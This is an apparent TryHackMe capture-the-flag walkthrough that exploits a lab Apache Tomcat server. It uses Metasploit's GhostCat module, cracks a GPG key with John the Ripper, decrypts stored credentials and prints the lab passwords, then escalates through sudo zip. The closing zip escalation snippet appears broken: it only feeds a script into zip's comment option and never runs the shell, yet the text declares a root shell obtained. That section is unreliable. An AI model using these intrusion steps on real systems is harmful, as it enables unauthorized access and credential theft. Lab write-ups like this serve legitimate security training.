# TryHackMe: Tomcat GhostCat CTF Walkthrough

## Overview

This CTF focuses on exploiting a vulnerable Apache Tomcat instance via the **GhostCat** vulnerability (CVE-2020-1938), recovering credentials through PGP decryption, and escalating privileges using misconfigured `zip` binary.

---

## Reconnaissance

### Rustscan Results

| Port | State | Service   | Details                                         |
|------|-------|-----------|--------------------------------------------------|
| 22   | open  | SSH       | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8                 |
| 53   | open  | tcpwrapped |                                                |
| 8009 | open  | ajp13     | Apache JServ Protocol v1.3                      |
| 8080 | open  | HTTP      | Apache Tomcat 9.0.30                            |

---

## Exploitation

### Vulnerability: GhostCat (Apache Tomcat AJP)

**Exploit Resource**:  
[Metasploit Module - tomcat_ghostcat](https://www.rapid7.com/db/modules/auxiliary/admin/http/tomcat_ghostcat/)

### Metasploit Commands
msf > use auxiliary/admin/http/tomcat_ghostcat
msf auxiliary(tomcat_ghostcat) > show actions
msf auxiliary(tomcat_ghostcat) > set ACTION <action-name>
msf auxiliary(tomcat_ghostcat) > show options
msf auxiliary(tomcat_ghostcat) > run

Upon execution:

    Found user: skyfuck

    Retrieved user.txt

    Password recovered: 8730281lkjlkjdqlksalks

Users Identified

    ✅ skyfuck (compromised)

    ❌ merlin (access pending)

Cracking Credentials
Step 1: Convert GPG key to hash

gpg2john tryhackme.asc > hash

Step 2: Brute-force with John the Ripper

john --wordlist=/usr/share/wordlists/rockyou.txt hash

📦 Cracked GPG password: alexandru
Decrypting Credentials

    Import key:

gpg --import tryhackme.asc

Decrypt credentials:

gpg --decrypt credentials.pgp

Extracted merlin credentials:

    asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Privilege Escalation
Sudo Permissions

sudo -l

Output:

User merlin may run the following commands on ubuntu:
(root : root) NOPASSWD: /usr/bin/zip

🔎 Use GTFOBins - zip for privilege escalation.
Exploit:

TF=$(mktemp -u)
echo '/bin/sh' > $TF
chmod +x $TF
sudo zip -q -z /tmp/root.zip /tmp/placeholder <<< $'unzip /tmp/root.zip -d /tmp/ && /tmp/'"$TF"

✅ Root shell obtained!
